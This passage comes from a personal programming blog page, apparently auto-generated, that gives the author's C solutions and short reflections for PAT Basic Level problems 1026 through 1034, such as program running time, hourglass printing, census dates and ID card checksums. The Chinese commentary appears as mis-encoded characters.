class="built_in">list</span>[r] = temp;</span><br><span class="line">l++, r--;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">if</span>(i == n<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d %d -1\n"</span>, <span class="built_in">list</span>[i].addr, <span class="built_in">list</span>[i].data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d %d %05d\n"</span>, <span class="built_in">list</span>[i].addr, <span class="built_in">list</span>[i].data, <span class="built_in">list</span>[i+<span class="number">1</span>].addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šéš¾ã€‚</strong></p><h3 id="1026-ç¨‹åºè¿è¡Œæ—¶é—´"><a href="#1026-ç¨‹åºè¿è¡Œæ—¶é—´" class="headerlink" title="1026 ç¨‹åºè¿è¡Œæ—¶é—´"></a>1026 ç¨‹åºè¿è¡Œæ—¶é—´</h3><p>è¿™ä¸ªé¢˜çš„æ¡ä»¶ï¼šä¸è¶³ 1 ç§’çš„æ—¶é—´å››èˆäº”å…¥åˆ°ç§’ã€‚ç¡¬æ˜¯æƒ³äº†å¥½ä¹…ã€‚ğŸ¤£</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200710080352310.png" alt="image-20200710080352310"></p><p>åé¢å‘ç°ï¼Œå…¶å®å½±å“é‚£ä¸ªç²¾åº¦çš„åœ¨ç¬¬ä¸€æ¬¡é™¤ä»¥CLK_TCKçš„æ—¶å€™ï¼Œä¸€ä¸ªå·§å¦™çš„åŠæ³•å°±æ˜¯é™¤å®ŒååŠ 0.5ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h = <span class="number">0</span>, m = <span class="number">0</span>, s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> c1 = <span class="number">0</span>, c2 = <span class="number">0</span>, tck = <span class="number">100</span>, ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;c1, &amp;c2);</span><br><span class="line">ans = (<span class="keyword">int</span>)((<span class="number">1.0</span>*(c2-c1)/<span class="number">100</span>+<span class="number">0.5</span>)); <span class="comment">//åŠ 0.5å¾ˆå·§å¦™çš„ã€‚</span></span><br><span class="line">h = ans/<span class="number">3600</span>;</span><br><span class="line">m = ans%<span class="number">3600</span>/<span class="number">60</span>;</span><br><span class="line">s = ans%<span class="number">3600</span>%<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d:%02d:%02d"</span>, h, m, s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1027-æ‰“å°æ²™æ¼"><a href="#1027-æ‰“å°æ²™æ¼" class="headerlink" title="1027 æ‰“å°æ²™æ¼"></a>1027 æ‰“å°æ²™æ¼</h3><p>éš¾ç‚¹ï¼šä¸€ä¸ªé«˜ä¸­æ•°å­¦é—®é¢˜ï¼Œæ‰¾è§„å¾‹æ±‚å‰ç­‰å·®æ•°åˆ—å‰né¡¹å’Œã€‚æ‰“å°å€’æ˜¯ç®€å•ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200710090155577.png" alt="image-20200710090155577"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, row = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %c"</span>, &amp;n, &amp;ch);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; ; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="number">2</span>*i*(i+<span class="number">2</span>)+<span class="number">1</span> &gt; n)</span><br><span class="line">&#123;</span><br><span class="line">row = i<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; (row*<span class="number">2</span>+<span class="number">1</span>)<span class="number">-2</span>*i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; row+<span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; row-i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">2</span>*i+<span class="number">1</span>; j++)</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, n-(<span class="number">2</span>*row*(row+<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šç¬¬ä¸€æ¬¡çœ‹åˆ°ï¼Œæ„Ÿè§‰é«˜ä¸­çŸ¥è¯†éƒ½å¿˜å®Œäº†ã€‚çœŸçš„è¦å¥½å¥½å­¦ä¹ å¤§å­¦é«˜ç­‰æ•°å­¦ã€‚</strong></p><h3 id="1028-äººå£æ™®æŸ¥"><a href="#1028-äººå£æ™®æŸ¥" class="headerlink" title="1028 äººå£æ™®æŸ¥"></a>1028 äººå£æ™®æŸ¥</h3><p>è¿™ä¸ªé¢˜ç”¨ä¹‹å‰ä¸ŠCè¯­è¨€è¯¾è€å¸ˆè®²çš„è”åˆä½åŸŸæ¥å­˜å‚¨æ—¥æœŸåšå¾ˆç®€å•ï¼Œä½†æ˜¯è¿˜æ˜¯è¢«é¢˜ç›®ä¸­çš„0æ¡ä»¶å¡äº†å¾ˆä¹…ï¼Œè¿™å·²ç»æ˜¯å¾ˆå¤šæ¬¡è¢«PATä¹™çº§çš„0æ¡ä»¶å¡äº†ï¼Œè¿™ä¸ªæ¡ä»¶çœŸä¸èƒ½å¤§æ„ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200712095104672.png" alt="image-20200712095104672"></p><p>1.å¼€å§‹æ²¡æœ‰æ³¨æ„ï¼Œåœ¨æ¯”è¾ƒçš„äººé‡Œå¼€å§‹ä¸èƒ½ä»¥0ä¸ºä¸‹æ ‡ï¼Œå› ä¸º0å¯èƒ½æ˜¯ä¸åˆæ³•çš„äººã€‚2.å½“äººæ•°ä¸º0æ—¶ï¼Œæœ€ååªè¾“å‡ºä¸€ä¸ª0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> data_compare;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> day: <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> month: <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> year: <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">Date date;</span><br><span class="line">&#125;People;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">1</span>;</span><br><span class="line">Date date1 = &#123;<span class="number">0</span>&#125;, date2 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, year = <span class="number">0</span>, month = <span class="number">0</span>, day = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">People *people = (People *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(People)*n);</span><br><span class="line"><span class="built_in">memset</span>(people, <span class="number">0</span>, <span class="keyword">sizeof</span>(People)*n);</span><br><span class="line"></span><br><span class="line">date1.year = <span class="number">2014</span>, date1.month = <span class="number">9</span>, date1.day = <span class="number">6</span>;</span><br><span class="line">date2.year = <span class="number">1814</span>, date2.month = <span class="number">9</span>, date2.day = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d/%d/%d"</span>, people[i].name, &amp;year, &amp;month, &amp;day);</span><br><span class="line">people[i].date.year = year, people[i].date.month = month, people[i].date.day = day;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(people[i].date.data_compare &gt;= date2.data_compare &amp;&amp; people[i].date.data_compare &lt;= date1.data_compare)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">max</span> = i, <span class="built_in">min</span> = i, flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span>(people[<span class="built_in">max</span>].date.data_compare &gt; people[i].date.data_compare)</span><br><span class="line"><span class="built_in">max</span> = i;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(people[<span class="built_in">min</span>].date.data_compare &lt; people[i].date.data_compare)</span><br><span class="line"><span class="built_in">min</span> = i;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %s %s"</span>, count, people[<span class="built_in">max</span>].name, people[<span class="built_in">min</span>].name);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šè¿™ä¸ªæ–¹æ³•æ¯”è¾ƒæ—¥æœŸå¤§å°çœŸä¸é”™ã€‚</strong></p><h3 id="1030-å®Œç¾æ•°åˆ—"><a href="#1030-å®Œç¾æ•°åˆ—" class="headerlink" title="1030 å®Œç¾æ•°åˆ—"></a>1030 å®Œç¾æ•°åˆ—</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715124816207.png" alt="image-20200715124816207"></p><p>å…³é”®åœ¨äºå†™å¾ªç¯æ—¶æ³¨æ„ä¸€ä¸ªèŠ‚çœæ—¶é—´çš„æŠ€å·§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span> , a[<span class="number">100000</span>], i = <span class="number">0</span>, j = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %lf"</span>, &amp;n, &amp;p);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"></span><br><span class="line">qsort(a, n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="built_in">max</span>; j &lt; n; j++) <span class="comment">//è¿™é‡Œæ¯æ¬¡ä»maxå¼€å§‹ã€‚</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; a[i]*p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = j-i &gt; <span class="built_in">max</span> ? j-i : <span class="built_in">max</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(j == n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = j-i+<span class="number">1</span> &gt; <span class="built_in">max</span> ? j-i+<span class="number">1</span> : <span class="built_in">max</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, <span class="built_in">max</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šéå†æ—¶æ³¨æ„èƒ½ä¸èƒ½èŠ‚çœæ—¶é—´ã€‚</strong></p><h3 id="1031-æŸ¥éªŒèº«ä»½è¯"><a href="#1031-æŸ¥éªŒèº«ä»½è¯" class="headerlink" title="1031 æŸ¥éªŒèº«ä»½è¯"></a>1031 æŸ¥éªŒèº«ä»½è¯</h3><p>è¿™é“é¢˜çœ‹å‡ºï¼Œæˆ‘å¯¹æƒé‡æœ‰è¯¯è§£ã€‚ã€‚ã€‚å¼€å§‹éƒ½å»ä¹˜ä¸ª0.01ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715125137219.png" alt="image-20200715125137219"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'X'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> q[<span class="number">17</span>] = &#123;<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">19</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>, sum = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">sum += (s[i]<span class="number">-48</span>)*q[i];</span><br><span class="line">sum = sum%<span class="number">11</span>; </span><br><span class="line"><span class="keyword">if</span>(a[sum] != s[<span class="number">17</span>])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s), flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All passed\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šæƒé‡ã€‚ã€‚</strong></p><h3 id="1033-æ—§é”®ç›˜æ‰“å­—"><a href="#1033-æ—§é”®ç›˜æ‰“å­—" class="headerlink" title="1033 æ—§é”®ç›˜æ‰“å­—"></a>1033 æ—§é”®ç›˜æ‰“å­—</h3><p>å…³é”®æ˜¯ç»Ÿè®¡åæ‰çš„é”®æ—¶æ³¨æ„ä¸€ä¸ªå­—æ¯åäº†ï¼Œä¸ä¹‹å¯¹åº”çš„å¤§å†™æˆ–å°å†™éƒ½è¦ç½®åçš„æ ‡å¿—ä½ã€‚è¿™ä¸ªè¿˜è¦å¼€å§‹å°±å†™ï¼Œä¸ç„¶åé¢å¾ˆéº»çƒ¦ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715125333175.png" alt="image-20200715125333175"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>] = &#123;<span class="number">0</span>&#125;, ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((ch = getchar()) != <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ch &gt;= <span class="number">65</span> &amp;&amp; ch &lt;= <span class="number">90</span>)</span><br><span class="line">a[ch]++, a[ch+<span class="number">32</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch &gt;= <span class="number">97</span> &amp;&amp; ch &lt;= <span class="number">122</span>)</span><br><span class="line">a[ch]++, a[ch<span class="number">-32</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[ch]++; </span><br><span class="line">&#125;</span><br><span class="line">gets(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="string">'+'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[s[i]] == <span class="number">0</span> &amp;&amp; (s[i] &lt; <span class="number">65</span> || s[i] &gt; <span class="number">90</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[s[i]] == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šæ— ã€‚</strong></p><h3 id="1034-æœ‰ç†æ•°å››åˆ™è¿ç®—"><a href="#1034-æœ‰ç†æ•°å››åˆ™è¿ç®—" class="headerlink" title="1034 æœ‰ç†æ•°å››åˆ™è¿ç®—"></a>1034 æœ‰ç†æ•°å››åˆ™è¿ç®—</h3><p>æˆ‘å±…ç„¶ä¸€ç›´ä¸çŸ¥é“åˆ†æ•°çš„åŠ å‡æ³•å¯ä»¥ç›´æ¥å†™çš„ï¼Œè¿˜åœ¨å“ªé‡Œé€šåˆ†åè®¡ç®—ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200719110513337-1612066095067.png" alt="image-20200719110513337"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gcd</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Inf"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> a1 = a, 